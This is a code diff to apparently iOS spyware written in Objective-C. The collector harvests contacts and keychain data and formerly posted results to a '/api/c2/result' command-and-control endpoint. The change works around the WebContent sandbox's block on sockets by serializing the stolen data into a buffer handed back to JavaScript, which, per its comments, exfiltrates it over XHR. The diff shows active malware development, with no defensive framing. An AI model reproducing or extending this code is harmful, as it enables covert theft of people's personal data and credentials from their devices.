@@ -137,12 +137,15 @@ static NSData *httpPost(NSString *urlStr, NSData *body) {
     return rawHTTP("POST", [path UTF8String], (const char *)[body bytes], (int)[body length]);
 }
 
+// socket() is denied in the WebContent process by the sandbox.
+// Collect everything into a dictionary, serialize at the end of collect(),
+// and hand the buffer back to JS which exfiltrates over its working XHR channel.
+static NSMutableDictionary *g_out = nil;
+
 static void postJSON(NSString *endpoint, id jsonObj) {
-    NSError *err = nil;
-    NSData *body = [NSJSONSerialization dataWithJSONObject:jsonObj options:0 error:&err];
-    if (!body) return;
-    NSString *path = endpoint;
-    rawHTTP("POST", [path UTF8String], (const char *)[body bytes], (int)[body length]);
+    if (!endpoint || !jsonObj) return;
+    if (!g_out) g_out = [NSMutableDictionary dictionary];
+    g_out[endpoint] = jsonObj;
 }
 
 // ─── 1. Contacts (CNContactStore) ─────────────────────────────────────────
@@ -557,6 +560,10 @@ static int collectKeychain(void) {
 typedef struct {
     const char *baseURL;
     const char *uuid;
+    char *out;        /* buffer provided by JS */
+    int   outCap;     /* capacity in bytes */
+    int   outLen;     /* filled by us: bytes written */
+    int   pad;
 } collect_ctx;
 
 static void resolveIdentity(void) {
@@ -634,15 +641,26 @@ int collect(void *ctx) {
         summary[@"host"] = [NSString stringWithUTF8String:g_host];
         summary[@"port"] = @(g_port);
 
-        NSData *r = [NSJSONSerialization dataWithJSONObject:@{
-            @"task_id": @0,
-            @"task_type": @"native_collect",
-            @"status": @"completed",
-            @"result": summary,
-        } options:0 error:nil];
-        if (r) {
-            NSData *resp = rawHTTP("POST", "/api/c2/result", (const char *)[r bytes], (int)[r length]);
-            if (resp) diag |= 512;
+        if (g_out) {
+            NSMutableDictionary *pkg = [NSMutableDictionary dictionary];
+            pkg[@"summary"] = summary;
+            pkg[@"data"] = g_out;
+            pkg[@"diag"] = @(diag);
+            pkg[@"host"] = [NSString stringWithUTF8String:g_host];
+            pkg[@"port"] = @(g_port);
+            pkg[@"uuid"] = g_uuid ? g_uuid : @"";
+            NSData *j = [NSJSONSerialization dataWithJSONObject:pkg options:0 error:nil];
+            if (j) {
+                collect_ctx *cc = (collect_ctx *)ctx;
+                if (cc && cc->out && cc->outCap > 8) {
+                    int n = (int)[j length];
+                    int cp = (n < (cc->outCap - 1)) ? n : (cc->outCap - 1);
+                    memcpy(cc->out, [j bytes], cp);
+                    cc->out[cp] = 0;
+                    cc->outLen = cp;
+                    diag |= 1024;
+                }
+            }
         }
         return diag;
     }
